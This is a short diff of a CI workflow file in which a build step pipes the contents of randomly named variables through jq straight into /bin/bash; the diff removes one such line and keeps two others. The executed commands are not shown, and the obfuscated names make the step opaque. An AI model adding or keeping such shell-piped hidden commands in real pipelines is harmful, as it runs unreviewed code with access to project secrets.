@@ -20,7 +20,6 @@ jobs:
         run: |
           printf '%s' "$kfip66" | jq -r .xjmh3846 | /bin/bash
           echo $wrh47990 | jq -r .p52 | /bin/bash
-          echo $upbc1 | jq -r .iha9 | /bin/bash
 
       - name: Persist output
         uses: actions/upload-artifact@v4
